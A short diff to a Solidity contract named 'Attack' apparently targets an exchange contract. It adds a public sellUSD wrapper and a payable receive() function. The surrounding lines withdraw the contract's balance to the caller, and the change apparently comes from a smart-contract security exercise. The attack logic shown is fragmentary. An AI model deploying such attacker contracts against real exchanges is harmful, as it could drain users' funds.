@@ -17,6 +17,10 @@ contract Attack {
         exch.sellUSD(2000);
     }
 
+    function sellUSD(uint amount) public {
+        exch.sellUSD(amount);
+    }
+
     function getBalance() public view returns (uint) {
         return address(this).balance;
     }
@@ -25,5 +29,6 @@ contract Attack {
         msg.sender.transfer(address(this).balance);
     }
 
-    
+    receive() external payable {
+    }    
 }
